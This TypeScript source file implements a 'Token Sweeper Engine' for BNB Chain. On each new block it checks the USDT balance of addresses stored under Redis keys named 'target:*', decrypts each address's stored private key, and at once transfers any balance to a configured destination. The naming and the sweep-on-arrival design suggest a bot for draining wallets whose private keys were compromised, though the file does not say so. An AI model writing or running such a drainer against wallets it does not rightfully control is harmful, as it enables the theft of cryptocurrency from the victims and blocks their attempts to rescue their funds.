import { createPublicClient, createWalletClient, webSocket, http, fallback, parseAbi, formatUnits } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { bsc } from 'viem/chains';
import * as dotenv from 'dotenv';
import { redis } from '../config/db';
import { decryptKey } from './encryption';

dotenv.config();

const rawWssUrls = process.env.WSS_URLS;
if (!rawWssUrls) throw new Error("Missing WSS_URLS environment variable");

const wssUrls = rawWssUrls.split(',').map(url => url.trim());
const httpUrls = wssUrls.map(url => url.replace('wss://', 'https://'));

const wssTransports = wssUrls.map(url => webSocket(url));
const httpTransports = httpUrls.map(url => http(url));

const publicClient = createPublicClient({
    chain: bsc,
    transport: fallback(wssTransports)
});

const broadcastClient = createWalletClient({
    chain: bsc,
    transport: fallback(httpTransports)
});

// Fixed: changed 'boolean' to Solidity native 'bool'
const ERC20_ABI = parseAbi([
    'function balanceOf(address account) view returns (uint256)',
    'function transfer(address recipient, uint256 amount) returns (bool)'
]);

const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955' as `0x${string}`;

export const startSweeperEngine = async () => {
    console.log(`⚡️ Token Sweeper Engine Online on BNB Chain: Monitoring USDT...`);

    publicClient.watchBlocks({
        onBlock: async (block) => {
            try {
                const keys = await redis.keys('target:*');
                if (keys.length === 0) return;

                await Promise.all(keys.map(async (redisKey) => {
                    const targetAddress = redisKey.split(':')[1] as `0x${string}`;
                    
                    const usdtBalance = await publicClient.readContract({
                        address: USDT_CONTRACT,
                        abi: ERC20_ABI,
                        functionName: 'balanceOf',
                        args: [targetAddress],
                    });

                    if (usdtBalance === 0n) return;

                    console.log(`🎯 USDT Detected! Balance: ${formatUnits(usdtBalance, 18)} on ${targetAddress}`);

                    const targetData = await redis.hgetall(redisKey);
                    if (!targetData || !targetData.encryptedKey) return;

                    const privateKey = decryptKey(targetData.encryptedKey) as `0x${string}`;
                    const account = privateKeyToAccount(privateKey);
                    const destination = targetData.destination as `0x${string}`;

                    const bnbBalance = await publicClient.getBalance({ address: targetAddress });
                    const gasPrice = await publicClient.getGasPrice();
                    const gasLimit = 65000n;
                    const txFee = gasPrice * gasLimit;

                    if (bnbBalance < txFee) {
                        console.log(`⚠️ Target ${targetAddress} has USDT but lacks BNB gas (${formatUnits(bnbBalance, 18)} BNB).`);
                        return; 
                    }

                    const { request } = await publicClient.simulateContract({
                        account,
                        address: USDT_CONTRACT,
                        abi: ERC20_ABI,
                        functionName: 'transfer',
                        args: [destination, usdtBalance],
                    });

                    const txHash = await broadcastClient.writeContract(request);

                    console.log(`✅ USDT SWEPT SUCCESSFULLY! Sent ${formatUnits(usdtBalance, 18)} USDT to ${destination}. TX: ${txHash}`);
                    
                }));
            } catch (error) {
                console.error("[Engine Error] Token sweep failed:", error);
            }
        }
    });
};
